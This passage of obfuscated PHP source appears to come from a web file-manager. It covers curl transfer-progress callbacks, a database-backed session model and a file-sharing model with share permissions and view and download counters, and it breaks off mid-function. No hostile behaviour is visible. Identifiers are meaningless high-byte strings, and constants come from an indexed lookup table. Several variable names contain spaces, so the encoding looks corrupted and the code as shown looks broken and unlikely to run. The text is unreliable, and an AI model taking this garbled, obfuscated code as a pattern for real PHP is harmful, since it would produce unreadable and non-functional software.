sourceRemove($¦‘±æ‚¦, $÷äñƒşô) { $É¾€©‚ =& $_SERVER[º·Ï‹¥³]; $this->sourceModelCopyFlag = !0; $áÛ¸ı•´ = 1; if (isset($¦‘±æ‚¦[$É¾€©‚[82]])) { $áÛ¸ı•´ = $¦‘±æ‚¦[$É¾€©‚[82]][$É¾€©‚[80]]; $áÛ¸ı•´ = $áÛ¸ı•´ + $¦‘±æ‚¦[$É¾€©‚[82]][$É¾€©‚[81]] + 1; } $this->update($áÛ¸ı•´); $this->sourceModelCopyFlag = !1; } public function sourceMove($ğ½á‹É®) { $this->sourceRemove($ğ½á‹É®, !1); } public function curlProgress($¢¿ÇÁ¢±, $–ì¨´ì¤, $ŸŸÑªÚû, $›±ïãÒ, $Á·˜®¿) { $Ó´¬À “ =& $_SERVER[º·Ï‹¥³]; $ª”úŠÄÌ =& $this->task; if ($Á·˜®¿ > 0) { $ª”úŠÄÌ[$Ó´¬À “[1114]] = $Ó´¬À “[1827]; $ª”úŠÄÌ[$Ó´¬À “[1809]] = $Ó´¬À “[110]; if ($ª”úŠÄÌ[$Ó´¬À “[1807]]) { $ª”úŠÄÌ[$Ó´¬À “[1808]] = $Á·˜®¿; } if ($ª”úŠÄÌ[$Ó´¬À “[1810]]) { $ª”úŠÄÌ[$Ó´¬À “[1808]] = $Á·˜®¿ + $ª”úŠÄÌ[$Ó´¬À “[1810]]; } } else { if ($ŸŸÑªÚû > 0) { if ($ª”úŠÄÌ[$Ó´¬À “[1807]] == $–ì¨´ì¤) { $ª”úŠÄÌ[$Ó´¬À “[1808]] = $ŸŸÑªÚû; $ª”úŠÄÌ[$Ó´¬À “[1114]] = $Ó´¬À “[1828]; $ª”úŠÄÌ[$Ó´¬À “[1809]] = $Ó´¬À “[1247]; } } } $this->update(); } public function curlProgressStart($öÖÊíî·) { } public function curlProgressEnd($ğÔ½¿“Ş) { $‚æ•ğì† =& $_SERVER[º·Ï‹¥³]; $Ş´¸´É‘ =& $this->task; $»»÷¢äë = curl_getinfo($ğÔ½¿“Ş); $âĞ®¼µŞ = $»»÷¢äë[$‚æ•ğì†[1829]]; if ($âĞ®¼µŞ == -1) { $âĞ®¼µŞ = $»»÷¢äë[$‚æ•ğì†[1830]]; } if ($Ş´¸´É‘[$‚æ•ğì†[1809]] == $‚æ•ğì†[110] && $âĞ®¼µŞ) { $Ş´¸´É‘[$‚æ•ğì†[1810]] += $âĞ®¼µŞ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $€àÑèèÊ =& $_SERVER[º·Ï‹¥³]; $§÷¨“Ï³ =& $this->task; $§÷¨“Ï³[$€àÑèèÊ[1831]] = 1; Hook::bind($€àÑèèÊ[1799], array($this, $€àÑèèÊ[1832])); Hook::bind($€àÑèèÊ[1801], array($this, $€àÑèèÊ[1833])); Hook::bind($€àÑèèÊ[1803], array($this, $€àÑèèÊ[1834])); } protected function endAfter() { $È·»ÌÇ’ =& $_SERVER[º·Ï‹¥³]; Hook::unbind($È·»ÌÇ’[1799], array($this, $È·»ÌÇ’[1832])); Hook::unbind($È·»ÌÇ’[1801], array($this, $È·»ÌÇ’[1833])); Hook::unbind($È·»ÌÇ’[1803], array($this, $È·»ÌÇ’[1834])); } public function progressStart($±âîæ³„) { $’ïØš¹Ã =& $_SERVER[º·Ï‹¥³]; $äË‡ä¹ = curl_getinfo($±âîæ³„); self::log($’ïØš¹Ã[1835] . $äË‡ä¹[$’ïØš¹Ã[358]]); self::valueSet($this->task[$’ïØš¹Ã[459]], $this->task); } public function progressEnd($ÁÍÍºñû) { $¦áé–Ø† =& $_SERVER[º·Ï‹¥³]; self::log($¦áé–Ø†[1836] . $this->task[$¦áé–Ø†[459]]); $this->end(); } public function progress($°–øªÌš, $ÉÒÇøÁê, $ç²ÊÀìß, $È›Šõ¾, $ƒ·¸¡ÑÒ) { $øÔØ›‘ =& $_SERVER[º·Ï‹¥³]; $ğ³Æ‰ÈÏ =& $this->task; if ($ƒ·¸¡ÑÒ > 0) { $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]] = $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]] == 0 ? $È›Šõ¾ : $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]]; $ğ³Æ‰ÈÏ[$øÔØ›‘[1755]] = $ƒ·¸¡ÑÒ; } else { if ($ç²ÊÀìß > 0) { $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]] = $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]] == 0 ? $ÉÒÇøÁê : $ğ³Æ‰ÈÏ[$øÔØ›‘[1112]]; $ğ³Æ‰ÈÏ[$øÔØ›‘[1755]] = $ç²ÊÀìß; } } $this->update(); self::log("\x70\x72\x6f\147\x72\x65\163\x73\110\164\164\x70\72\144\157\x77\x6e\72{$ç²ÊÀìß}\x2f{$ÉÒÇøÁê}\73\x20\165\160\154\157\141\144\72{$ƒ·¸¡ÑÒ}\57{$È›Šõ¾}\x3b"); } } goto B‰â¼æ›õî; CîÈ™éâ»: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\x5f\x73\145\x73\163\x69\157\156"; public function get($¼‰…ÄÜß) { $€¼Ãóàò =& $_SERVER[º·Ï‹¥³]; $¡ØÉ«óÜ = $this->where(array($€¼Ãóàò[2092] => $¼‰…ÄÜß))->find(); if (!is_array($¡ØÉ«óÜ)) { return !1; } return $¡ØÉ«óÜ[$€¼Ãóàò[806]]; } public function set($–áìöÌ, $‘ğÄş–Ó, $÷„É‚úª = 3600) { $ÜØ·¡Õ¡ =& $_SERVER[º·Ï‹¥³]; $Õş¾’‡Ï = array($ÜØ·¡Õ¡[2092] => $–áìöÌ, $ÜØ·¡Õ¡[1991] => $‘ğÄş–Ó, $ÜØ·¡Õ¡[2093] => $÷„É‚úª + time()); if (Session::get($ÜØ·¡Õ¡[2094])) { $Õş¾’‡Ï[$ÜØ·¡Õ¡[1754]] = Session::get($ÜØ·¡Õ¡[2094]); } else { $Õş¾’‡Ï[$ÜØ·¡Õ¡[1754]] = 0; } if ($this->get($–áìöÌ)) { return $this->where(array($ÜØ·¡Õ¡[2092] => $–áìöÌ))->save($Õş¾’‡Ï); } else { return $this->add($Õş¾’‡Ï, array(), !0); } } public function remove($ÏÍ¹Œ˜ª) { return $this->where(array($_SERVER[º·Ï‹¥³][2092] => $ÏÍ¹Œ˜ª))->delete(); } public function clearTimeout() { return $this->where($_SERVER[º·Ï‹¥³][2095] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\x65\x72\x74\x2c\x75\x70\x64\x61\x74\145", "\x66\165\156\x63\164\x69\157\x6e"), array("\x63\x72\x65\x61\164\x65\124\x69\155\x65", "\164\151\x6d\x65", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\157\x70\x74\x69\157\156\x73", '', "\x69\156\163\x65\x72\164\x2c\x75\x70\144\141\x74\145\54\x73\145\x6c\145\143\x74", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Û®ŸÉ‡Ğ) { $ ©ƒĞ¥ =& $_SERVER[º·Ï‹¥³]; $ğæå½Ü = isset($Û®ŸÉ‡Ğ[0]) ? $Û®ŸÉ‡Ğ[0] : !1; return array($ ©ƒĞ¥[2096] => array(USER_ID, $ ©ƒĞ¥[2097]), $ ©ƒĞ¥[2037] => array($ğæå½Ü, $ ©ƒĞ¥[2098])); } protected function listSimple() { $¼¿üÄ§ = array($_SERVER[º·Ï‹¥³][1754] => USER_ID); $«öÃ·Ñ¿ = $this->field($this->fieldList)->where($¼¿üÄ§)->select(); return $«öÃ·Ñ¿ ? $«öÃ·Ñ¿ : array(); } protected function getInfo($ùƒ›À‡ï, $–•—èŒ¿ = false) { $Ã‰Ğ¾şé =& $_SERVER[º·Ï‹¥³]; if ($–•—èŒ¿) { return $this->_getShareInfo(array($Ã‰Ğ¾şé[649] => $ùƒ›À‡ï)); } $§µœƒˆĞ = $this->cacheFunctionGet($Ã‰Ğ¾şé[2039], $ùƒ›À‡ï); return $§µœƒˆĞ; } public function getInfoByHash($ƒš–ı–Ğ) { return $this->_getShareInfo(array($_SERVER[º·Ï‹¥³][2099] => $ƒš–ı–Ğ)); } public function getInfoByPath($­”÷À³) { $±à¤àâ =& $_SERVER[º·Ï‹¥³]; $Öˆ ÔÛŒ = array($±à¤àâ[1754] => USER_ID, $±à¤àâ[184] => $­”÷À³); return $this->_getShareInfo($Öˆ ÔÛŒ); } public function getInfoBySourcePath($”É£ì‚¦) { $Æ·ÓÕ‚Ü =& $_SERVER[º·Ï‹¥³]; $éÅ´Şèµ = array($Æ·ÓÕ‚Ü[1754] => USER_ID, $Æ·ÓÕ‚Ü[1228] => $”É£ì‚¦); return $this->_getShareInfo($éÅ´Şèµ); } private function _getShareInfo($ßè£Ø—) { $í´ÕÃê™ =& $_SERVER[º·Ï‹¥³]; $Ôó¡×“‡ = $this->where($ßè£Ø—)->find(); if (!$Ôó¡×“‡) { return !1; } $ßè£Ø— = array($í´ÕÃê™[649] => $Ôó¡×“‡[$í´ÕÃê™[649]]); $³‡Ï÷‚ = $í´ÕÃê™[2100]; $Ò’°ş¿Ÿ = Model($í´ÕÃê™[650])->order($í´ÕÃê™[459])->field($³‡Ï÷‚)->where($ßè£Ø—)->select(); if ($Ôó¡×“‡[$í´ÕÃê™[184]] == $í´ÕÃê™[219]) { $Ôó¡×“‡[$í´ÕÃê™[90]] = IO::info($Ôó¡×“‡[$í´ÕÃê™[1228]]); } else { $Ôó¡×“‡[$í´ÕÃê™[90]] = Model($í´ÕÃê™[1388])->pathInfo($Ôó¡×“‡[$í´ÕÃê™[184]]); } $Ôó¡×“‡[$í´ÕÃê™[2101]] = $Ò’°ş¿Ÿ; return $Ôó¡×“‡; } protected function getInfoAuth($ ş™÷œÀ) { $şƒ¥íá– =& $_SERVER[º·Ï‹¥³]; $­¿ÆæÇ¼ = $this->getInfo($ ş™÷œÀ); if ($­¿ÆæÇ¼[$şƒ¥íá–[1754]] == USER_ID) { $­¿ÆæÇ¼[$şƒ¥íá–[471]] = $­¿ÆæÇ¼[$şƒ¥íá–[90]][$şƒ¥íá–[471]]; } else { $­¿ÆæÇ¼[$şƒ¥íá–[471]] = Model($şƒ¥íá–[552])->authMake($­¿ÆæÇ¼[$şƒ¥íá–[2101]]); } return $­¿ÆæÇ¼; } protected function listData($ŠšÉøğİ = null, $çÒ‘ìéè = 300) { $ØêıÁ¬ı =& $_SERVER[º·Ï‹¥³]; $ëüÅ“Ó« = array(array($ØêıÁ¬ı[547] => array($ØêıÁ¬ı[1061], 0), $ØêıÁ¬ı[647] => array($ØêıÁ¬ı[1061], 0), $ØêıÁ¬ı[2102] => $ØêıÁ¬ı[2055])); if ($ŠšÉøğİ == $ØêıÁ¬ı[2103]) { $ëüÅ“Ó« = array($ØêıÁ¬ı[547] => 1); } else { if ($ŠšÉøğİ == $ØêıÁ¬ı[1213]) { $ëüÅ“Ó« = array($ØêıÁ¬ı[647] => 1); } } $ëüÅ“Ó«[$ØêıÁ¬ı[1754]] = USER_ID; $äÉÄµ¢Ù = $this->where($ëüÅ“Ó«)->selectPage($çÒ‘ìéè); return $äÉÄµ¢Ù; } protected function listToMe($ºÕ÷Â = 300) { $ìúº´‡æ =& $_SERVER[º·Ï‹¥³]; $Åş£¶¥ = Model($ìúº´‡æ[2104])->userGroupParents(USER_ID); $ÊÎôƒ¨ı = array($ìúº´‡æ[632] => SourceModel::TYPE_USER, $ìúº´‡æ[554] => USER_ID); if ($Åş£¶¥) { $ÊÎôƒ¨ı = array(array($ìúº´‡æ[632] => SourceModel::TYPE_USER, $ìúº´‡æ[554] => USER_ID), array($ìúº´‡æ[632] => SourceModel::TYPE_GROUP, $ìúº´‡æ[554] => array($ìúº´‡æ[7], $Åş£¶¥)), $ìúº´‡æ[2102] => $ìúº´‡æ[2055]); } $“ı¾•Úà = Model($ìúº´‡æ[650])->where($ÊÎôƒ¨ı)->selectPage($ºÕ÷Â); $™é¾‡å¾ = array_to_keyvalue_group($“ı¾•Úà[$ìúº´‡æ[429]], $ìúº´‡æ[649]); if (!$™é¾‡å¾) { return $“ı¾•Úà; } $‘ÔàúºÕ = $ìúº´‡æ[2105]; $ÊÎôƒ¨ı = array($ìúº´‡æ[649] => array($ìúº´‡æ[476], array_keys($™é¾‡å¾)), $ìúº´‡æ[1754] => array($ìúº´‡æ[1063], $ìúº´‡æ[219])); $ÑÉ†ËÈƒ = $this->field($‘ÔàúºÕ)->where($ÊÎôƒ¨ı)->select(); foreach ($ÑÉ†ËÈƒ as $ãÆ¯â„¿ => &$üÆãÌù›) { $üÆãÌù›[$ìúº´‡æ[2101]] = $™é¾‡å¾[$üÆãÌù›[$ìúº´‡æ[649]]]; } unset($üÆãÌù›); $ƒ¨±îªÉ = array($ìúº´‡æ[2106] => $ÑÉ†ËÈƒ, $ìúº´‡æ[2107] => $“ı¾•Úà[$ìúº´‡æ[426]]); return $ƒ¨±îªÉ; } protected function shareAdd($×ĞÆ²Î¦, $”Â«É’) { $öŸÙ–íŸ =& $_SERVER[º·Ï‹¥³]; $”–Ğ›†‘ = $this->_addShareData($×ĞÆ²Î¦, $”Â«É’); if (!empty($”Â«É’[$öŸÙ–íŸ[2108]])) { $this->_shareAuthSet($”–Ğ›†‘, $”Â«É’[$öŸÙ–íŸ[2108]]); } $this->shareEventAdd($×ĞÆ²Î¦, $”Â«É’, $öŸÙ–íŸ[2109]); return $”–Ğ›†‘; } protected function shareAddSystem($ŒÚ›Øğß, $¦Ù¥©ŠĞ) { $º’ŠÁÍ¿ =& $_SERVER[º·Ï‹¥³]; $‹÷ºŸĞñ = $this->_addShareData($ŒÚ›Øğß, $¦Ù¥©ŠĞ, $º’ŠÁÍ¿[182]); $this->_shareAuthSet($‹÷ºŸĞñ, $¦Ù¥©ŠĞ[$º’ŠÁÍ¿[2108]]); return $‹÷ºŸĞñ; } private function shareEventAdd($·¤œ™œ, $ÌÆ´ÈÓ, $¤ıá¯ğ€ = "\141\x64\144") { $ëş£€€ =& $_SERVER[º·Ï‹¥³]; if (!$·¤œ™œ || $·¤œ™œ == $ëş£€€[219]) { return; } if ($¤ıá¯ğ€ == $ëş£€€[2109]) { if ($ÌÆ´ÈÓ[$ëş£€€[547]] == $ëş£€€[91]) { Model($ëş£€€[617])->eventShare($·¤œ™œ, $ëş£€€[2110]); } if ($ÌÆ´ÈÓ[$ëş£€€[647]] == $ëş£€€[91]) { Model($ëş£€€[617])->eventShare($·¤œ™œ, $ëş£€€[2111]); } return; } $˜Â™éÜµ = $this->getInfoByPath($·¤œ™œ); $øûñ¬Åá = $ëş£€€[2112]; if ($˜Â™éÜµ[$ëş£€€[547]] == $ëş£€€[219] && $ÌÆ´ÈÓ[$ëş£€€[547]] == $ëş£€€[91]) { $øûñ¬Åá = $ëş£€€[2110]; } if ($˜Â™éÜµ[$ëş£€€[547]] == $ëş£€€[91] && $ÌÆ´ÈÓ[$ëş£€€[547]] == $ëş£€€[219]) { $øûñ¬Åá = $ëş£€€[2113]; } if ($˜Â™éÜµ[$ëş£€€[647]] == $ëş£€€[219] && $ÌÆ´ÈÓ[$ëş£€€[647]] == $ëş£€€[91]) { $øûñ¬Åá = $ëş£€€[2111]; } if ($˜Â™éÜµ[$ëş£€€[647]] == $ëş£€€[91] && $ÌÆ´ÈÓ[$ëş£€€[647]] == $ëş£€€[219]) { $øûñ¬Åá = $ëş£€€[2114]; } Model($ëş£€€[617])->eventShare($·¤œ™œ, $øûñ¬Åá); return; } private function _addShareData($Â¼íÕÂÂ, $íÂî­íï = array(), $îÊ¡ƒ¾ = false) { $èŠ³˜ë¾ =& $_SERVER[º·Ï‹¥³]; $ÃÙ×Ë¦ = $îÊ¡ƒ¾ == $èŠ³˜ë¾[182] ? 0 : USER_ID; $†œ©ßŸÀ = array($èŠ³˜ë¾[475] => $Â¼íÕÂÂ, $èŠ³˜ë¾[1745] => $ÃÙ×Ë¦); if ($Â¼íÕÂÂ == 0) { $†œ©ßŸÀ = array($èŠ³˜ë¾[2115] => $íÂî­íï[$èŠ³˜ë¾[1228]], $èŠ³˜ë¾[1745] => $ÃÙ×Ë¦); } if ($ÚÓÜÏéš = $this->where($†œ©ßŸÀ)->find()) { return $ÚÓÜÏéš[$èŠ³˜ë¾[649]]; } if ($Â¼íÕÂÂ == 0) { $ÆíÍèúù = array($èŠ³˜ë¾[32] => get_path_this($íÂî­íï[$èŠ³˜ë¾[87]])); } else { $ÆíÍèúù = Model($èŠ³˜ë¾[876])->sourceInfo($Â¼íÕÂÂ); if (!$ÆíÍèúù) { return !1; } } if (!$íÂî­íï[$èŠ³˜ë¾[1643]]) { $íÂî­íï[$èŠ³˜ë¾[1643]] = $ÆíÍèúù[$èŠ³˜ë¾[32]]; } $¨ÇÆº»š = array($èŠ³˜ë¾[1745] => $ÃÙ×Ë¦, $èŠ³˜ë¾[475] => $Â¼íÕÂÂ, $èŠ³˜ë¾[1643] => $èŠ³˜ë¾[12], $èŠ³˜ë¾[547] => 0, $èŠ³˜ë¾[647] => 0, $èŠ³˜ë¾[1228] => $èŠ³˜ë¾[12], $èŠ³˜ë¾[358] => $èŠ³˜ë¾[12], $èŠ³˜ë¾[938] => $èŠ³˜ë¾[12], $èŠ³˜ë¾[2116] => 0, $èŠ³˜ë¾[2117] => 0, $èŠ³˜ë¾[813] => 0, $èŠ³˜ë¾[2118] => $èŠ³˜ë¾[12], $èŠ³˜ë¾[2099] => $èŠ³˜ë¾[12]); $™ƒçç = explode($èŠ³˜ë¾[50], $èŠ³˜ë¾[2119]); foreach ($™ƒçç as $íûî¿ñä) { if (!isset($íÂî­íï[$íûî¿ñä])) { continue; } $¨ÇÆº»š[$íûî¿ñä] = $íÂî­íï[$íûî¿ñä]; } $Şíœà˜œ = $this->add($¨ÇÆº»š); $âûüà«œ = array($èŠ³˜ë¾[2099] => short_id($Şíœà˜œ)); $this->where(array($èŠ³˜ë¾[2120] => $Şíœà˜œ))->save($âûüà«œ); return $Şíœà˜œ; } private function _shareAuthSet($Ñ¢ÌîÊÜ, $ÍÙÖıÍ™) { $£ÈŸæòğ =& $_SERVER[º·Ï‹¥³]; if (!is_array($ÍÙÖıÍ™)) { return !1; } $ŞÚå§Ú = Model($£ÈŸæòğ[2065]); $ŞÚå§Ú->where(array($£ÈŸæòğ[649] => $Ñ¢ÌîÊÜ))->delete(); $«Èú–«Ö = array(); foreach ($ÍÙÖıÍ™ as $â… Èİ ) { $»ˆğ‚ = SourceModel::TYPE_USER; if ($â… Èİ [$£ÈŸæòğ[181]] == SourceModel::TYPE_GROUP) { $»ˆğ‚ = SourceModel::TYPE_GROUP; } $ƒà÷ÔÓ = array($£ÈŸæòğ[649] => $Ñ¢ÌîÊÜ, $£ÈŸæòğ[181] => $»ˆğ‚, $£ÈŸæòğ[554] => intval($â… Èİ [$£ÈŸæòğ[554]]), $£ÈŸæòğ[2061] => 0, $£ÈŸæòğ[2121] => -1); if ($â… Èİ [$£ÈŸæòğ[2061]]) { $ƒà÷ÔÓ[$£ÈŸæòğ[2061]] = $â… Èİ [$£ÈŸæòğ[2061]]; } else { if ($â… Èİ [$£ÈŸæòğ[2121]]) { $ƒà÷ÔÓ[$£ÈŸæòğ[2121]] = $â… Èİ [$£ÈŸæòğ[2121]]; } } $«Èú–«Ö[] = $ƒà÷ÔÓ; } return $ŞÚå§Ú->addAll($«Èú–«Ö, array(), !0); } public function numViewAdd($µÔéÑ æ) { $µÃÜçœÒ =& $_SERVER[º·Ï‹¥³]; $ìà¿Óƒ‡ = array($µÃÜçœÒ[2120] => $µÔéÑ æ); $this->where($ìà¿Óƒ‡)->setAdd($µÃÜçœÒ[2116]); } public function numDownloadAdd($æ‹Ê¦µ·) { $Á›—À¬Ö =& $_SERVER[º·Ï‹¥³]; $ÆĞ™Œšà = array($Á›—À¬Ö[2120] => $æ‹Ê¦µ·); $this->where($ÆĞ™Œšà)->setAdd($Á›—À¬Ö[2117]); } protected function shareEdit($ï‘ĞĞÏÜ, $§Õˆ¹Œ) { $Ñ³Ô Ÿ’ =& $_SERVER[º·Ï‹¥³]; $ä´Ğó¶ = $this->getInfo($ï‘ĞĞÏÜ); if (!$ä´Ğó¶) { return !1; } $this->_checkLinkShare($§Õˆ¹Œ, $ä´Ğó¶); $“­ÍŸ›‡ = array(); $´‰­ˆÒí = explode($Ñ³Ô Ÿ’[50], $Ñ³Ô Ÿ’[2122]); foreach ($´‰­ˆÒí as $´ÓÁß—é) { if (!array_key_exists($´ÓÁß—é, $§Õˆ¹Œ)) { continue; } $“­ÍŸ›‡[$´ÓÁß—é] = $§Õˆ¹Œ[$´ÓÁß—é]; } $this->shareEventAdd($ä´Ğó¶[$Ñ³Ô Ÿ’[184]], $§Õˆ¹Œ, $Ñ³Ô Ÿ’[1922]); $this->where(array($Ñ³Ô Ÿ’[2120] => $ï‘ĞĞÏÜ))->save($“­ÍŸ›‡); if (isset($§Õˆ¹Œ[$Ñ³Ô Ÿ’[2108]])) { $this->_shareAuthSet($ï‘ĞĞÏÜ, $§Õˆ¹Œ[$Ñ³Ô Ÿ’[2108]]); } return !0; } private function _checkLinkShare($í¨ÌÆäğ, $‘Şœ¿äâ) { $®ÖÌá–Ä =& $_SERVER[º·Ï‹¥³]; if ($í¨ÌÆäğ[$®ÖÌá–Ä[547]] != $®ÖÌá–Ä[91]) { return; } $‘Ûˆ–•Ä = $‘Şœ¿äâ[$®ÖÌá–Ä[90]][$®ÖÌá–Ä[184]]; if ($‘Şœ¿äâ[$®ÖÌá–Ä[90]][$®ÖÌá–Ä[33]] != $®ÖÌá–Ä[221]) { $ñ’ÑÀ­˜ = $this->_folderReport($‘Ûˆ–•Ä); if (!$ñ’ÑÀ­˜) { return; } show_json(LNG($®ÖÌá–Ä[2123]) . $®ÖÌá–Ä[2124] . $ñ’ÑÀ­˜, !1); } $ï€ìÓ­· = Model($®ÖÌá–Ä[876])->fileInfoGet($‘Şœ¿äâ[$®ÖÌá–Ä[90]][$®ÖÌá–Ä[184]]); if (!$ï€ìÓ­·) { return; } $ŸÉ”Çš¦ = $this->shareFileMeta($ï€ìÓ­·[$®ÖÌá–Ä[525]]); if (isset($ŸÉ”Çš¦[$®ÖÌá–Ä[434]]) && $ŸÉ”Çš¦[$®ÖÌá–Ä[434]] == $®ÖÌá–Ä[91]) { show_json(LNG($®ÖÌá–Ä[2125]), !1); } } private function _folderReport($åãÂ‰) { $Œñùƒœá =& $_SERVER[º·Ï‹¥³]; $³‰­ğìú = array($Œñùƒœá[525] => array($Œñùƒœá[1061], 0), $Œñùƒœá[802] => 3); $€¿úŒ´ = Model($Œñùƒœá[2126])->where($³‰­ğìú)->field($Œñùƒœá[525])->select(); if (!$€¿úŒ´) { return !1; } $€¿úŒ´ = array_to_keyvalue($€¿úŒ´, $Œñùƒœá[12], $Œñùƒœá[525]); $ÜÄğ’‘ = $Œñùƒœá[50] . $åãÂ‰ . $Œñùƒœá[50]; $³‰­ğìú = array($Œñùƒœá[525] => array($Œñùƒœá[7], $€¿úŒ´), $Œñùƒœá[569] => array($Œñùƒœá[443], "\45{$ÜÄğ’‘}\45"), $Œñùƒœá[489] => 0); $¨‰ş¡ìÙ = Model($Œñùƒœá[876])->where($³‰­ğìú)->field($Œñùƒœá[2127])->find(); if (!$¨‰ş¡ìÙ) { return !1; } $Ê³û°û¥ = substr($¨‰ş¡ìÙ[$Œñùƒœá[569]], strpos($¨‰ş¡ìÙ[$Œñùƒœá[569]], $ÜÄğ’‘)); $³‰­ğìú = array($Œñùƒœá[184] => array($Œñùƒœá[7], trim($Ê³û°û¥, $Œñùƒœá[50]))); $ ³Ìùîã = Model($Œñùƒœá[876])->where($³‰­ğìú)->field($Œñùƒœá[32])->select(); $¶ğ¯âÈ¾ = array_to_keyvalue($ ³Ìùîã, $Œñùƒœá[12], $Œñùƒœá[32]); $¶ğ¯âÈ¾[] = $¨‰ş¡ìÙ[$Œñùƒœá[32]]; return implode($Œñùƒœá[8], $¶ğ¯âÈ¾); } protected function remove($Àú™ƒë) { $’¿æ´€– =& $_SERVER[º·Ï‹¥³]; if (is_array($Àú™ƒë)) { $Àú™ƒë = array($’¿æ´€–[7], $Àú™ƒë); } $ÖÖÜ×é = array($’¿æ´€–[649] => $Àú™ƒë); $òÚÃë¢¢ = $this->where($ÖÖÜ×é)->delete(); if ($òÚÃë¢¢) { Model($’¿æ´€–[650])->where(array($’¿æ´€–[649] => $Àú™ƒë))->delete(); } $Á»–à÷° = is_array($Àú™ƒë) ? $Àú™ƒë[1] : array($Àú™ƒë); for ($§çûº… = 0; $§çûº… < count($Á»–à÷°); $§çûº…++) { $¹Ùã©£§ = $this->getInfo($Á»–à÷°[$§çûº…]); if ($¹Ùã©£§[$’¿æ´€–[647]] == $’¿æ´€–[91]) { Model($’¿æ´€–[617])->eventShare($¹Ùã©£§[$’¿æ´€–[184]], $’¿æ´€–[2114]); } if ($¹Ùã©£§[$’¿æ´€–[547]] == $’¿æ´€–[91]) { Model($’¿æ´€–[617])->eventShare($¹Ùã©£§[$’¿æ´€–[184]], $’¿æ´€–[2113]); } } return $òÚÃë¢¢; } protected function removeBySource($ëô¨†¦™) { $£½¾€ =& $_SERVER[º·Ï‹¥³]; $¶Ş£‘¢ = array($£½¾€[475] => array($£½¾€[476], $ëô¨†¦™)); $¤‹†İ¤‡ = $this->field($£½¾€[649])->where($¶Ş£‘¢)->select(); $¤‹†İ¤‡ = array_to_keyvalue($¤‹†İ¤‡, $£½¾€[12], $£½¾€[649]); if (!$¤‹†İ¤‡) { return; } $¶Ş£‘¢ = array($£½¾€[2120] => array($£½¾€[476], $¤‹†İ¤‡)); $this->where($¶Ş£‘¢)->delete(); Model($£½¾€[650])->where($¶Ş£‘¢)->delete(); } public function listAll($Á‡ø¢‚) { $¾’—Àñô =& $_SERVER[º·Ï‹¥³]; $Ş´»§€Œ = array(); if ($Á‡ø¢‚[$¾’—Àñô[1754]]) { $Ş´»§€Œ[$¾’—Àñô[1754]] = $Á‡ø¢‚[$¾’—Àñô[1754]]; } if ($Á‡ø¢‚[$¾’—Àñô[812]]) { $”ãîª¤ = $Á‡ø¢‚[$¾’—Àñô[813]] ? $Á‡ø¢‚[$¾’—Àñô[813]] : strtotime(date($¾’—Àñô[2128])); $Ş´»§€Œ[$¾’—Àñô[222]] = array($¾’—Àñô[384], array($Á‡ø¢‚[$¾’—Àñô[812]], $”ãîª¤)); } if ($Á‡ø¢‚[$¾’—Àñô[33]]) { $Ş´»§€Œ[$Á‡ø¢‚[$¾’—Àñô[33]]] = 1; } else { $Ş´»§€Œ[] = array($¾’—Àñô[547] => array($¾’—Àñô[1061], 0), $¾’—Àñô[647] => array($¾’—Àñô[1061], 0), $¾’—Àñô[2102] => $¾’—Àñô[2055]); } if ($Á‡ø¢‚[$¾’—Àñô[2051]]) { $Ş´»§€Œ[] = array($¾’—Àñô[2099] => $Á‡ø¢‚[$¾’—Àñô[2051]], $¾’—Àñô[1643] => array($¾’—Àñô[443], "\x25{$Á‡ø¢‚[$¾’—Àñô[2051]]}\45"), $¾’—Àñô[2102] => $¾’—Àñô[2055]); } $Í«É·Äµ = $this->_makeOrder()->where($Ş´»§€Œ)->selectPage(20); if (empty($Í«É·Äµ[$¾’—Àñô[429]])) { return array(); } $this->_listDataApply($Í«É·Äµ[$¾’—Àñô[429]]); return $Í«É·Äµ; } public function listDataApply($˜¡‘Ç’³) { $this->_listDataApply($˜¡‘Ç’³); return $˜¡‘Ç’³; } private function _listDataApply(&$øÜùåë‹) { $Üì¨‹…ˆ =& $_SERVER[º·Ï‹¥³]; $Â§¬¿òà = array_to_keyvalue($øÜùåë‹, $Üì¨‹…ˆ[12], $Üì¨‹…ˆ[1754]); $¸¡¤¢åë = Model($Üì¨‹…ˆ[583])->userListInfo(array_unique($Â§¬¿òà)); $Â¸ùÓ²¯ = array_to_keyvalue($øÜùåë‹, $Üì¨‹…ˆ[12], $Üì¨‹…ˆ[184]); $¿Šùøêï = Model($Üì¨‹…ˆ[876])->sourceListInfo($Â¸ùÓ²¯, !0); foreach ($øÜùåë‹ as $øˆ»„ => &$ı¨ÇÎÓô) { $¢î„ ”À = $ı¨ÇÎÓô[$Üì¨‹…ˆ[1754]]; $ı¨ÇÎÓô[$Üì¨‹…ˆ[2129]] = $¸¡¤¢åë[$¢î„ ”À] ? $¸¡¤¢åë[$¢î„ ”À] : !1; $ªôÑÍ¦¬ = $ı¨ÇÎÓô[$Üì¨‹…ˆ[184]]; $ı¨ÇÎÓô[$Üì¨‹…ˆ[90]] = $¿Šùøêï[$ªôÑÍ¦¬] ? $¿Šùøêï[$ªôÑÍ¦¬] : !1; if ($ı¨ÇÎÓô[$Üì¨‹…ˆ[90]][$Üì¨‹…ˆ[489]] == $Üì¨‹…ˆ[91]) { unset($øÜùåë‹[$øˆ»„]); } if ($ı¨ÇÎÓô[$Üì¨‹…ˆ[90]] != $Üì¨‹…ˆ[219] && !$ı¨ÇÎÓô[$Üì¨‹…ˆ[90]]) { unset($øÜùåë‹[$øˆ»„]); } } unset($ı¨ÇÎÓô); $øÜùåë‹ = array_values($øÜùåë‹); } private function _makeOrder($à¬Ñî‚Š = '') { $Ã®Ü©Åã =& $_SERVER[º·Ï‹¥³]; $á˜£“òÈ = array($Ã®Ü©Åã[222], $Ã®Ü©Åã[813], $Ã®Ü©Åã[2116], $Ã®Ü©Åã[2117]); $şÕ˜ÇƒÏ = array($Ã®Ü©Åã[507] => $Ã®Ü©Åã[508], 